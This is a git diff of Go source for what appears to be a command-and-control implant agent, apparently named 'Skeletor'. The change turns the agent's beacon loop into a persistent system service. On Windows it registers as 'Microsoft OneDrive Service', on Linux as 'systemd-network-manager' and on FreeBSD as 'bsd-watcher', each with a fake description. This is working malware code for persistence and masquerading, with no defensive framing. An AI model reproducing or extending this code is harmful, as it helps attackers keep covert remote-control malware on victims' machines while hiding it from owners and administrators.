@@ -11,7 +11,10 @@ import (
 	"runtime"
 	"strings"
 	"time"
+	"github.com/kardianos/service"
 )
+
+type program struct{}
 
 type Agent struct {
 	LocalIP          string
@@ -133,8 +136,14 @@ func (agent *Agent) Sleep() {
 	time.Sleep(time.Duration(sleepTime) * time.Second)
 }
 
-func main() {
-	agent := Agent{
+func (p *program) Start(s service.Service) error {
+    // Start the "real" work in a goroutine so this returns immediately
+    go p.run()
+    return nil
+}
+
+func (p *program) run() {
+    agent := Agent{
 		LocalIP:          getLocalIP(),
 		ServerIP:         "127.0.0.1",
 		ServerPort:       80,
@@ -254,4 +263,35 @@ func main() {
 			continue
 		}
 	}
+}
+
+func (p *program) Stop(s service.Service) error {
+    // Cleanup logic here
+    return nil
+}
+
+func main() {
+	svcConfig := &service.Config{
+        Name: "Skeletor-Service", // Fallback name
+    }
+    switch runtime.GOOS {
+    case "windows":
+        svcConfig.Name = "OneDrive"
+		svcConfig.DisplayName = "Microsoft OneDrive Service"
+		svcConfig.Description = "Provides cloud file synchronization and backup services."
+    case "linux":
+        svcConfig.Name = "systemd-network-manager"
+        svcConfig.DisplayName = "Systemd Network Manager Service"
+        svcConfig.Description = "Systemd Network Manager Service"
+    case "freebsd":
+        svcConfig.Name = "bsd-watcher"
+        svcConfig.DisplayName = "FreeBSD Watcher"
+        svcConfig.Description = "Monitoring daemon for FreeBSD systems."
+    }
+    prg := &program{}
+    s, err := service.New(prg, svcConfig)
+	if err != nil {
+        log.Fatal(err)
+    }
+    s.Run()
 }
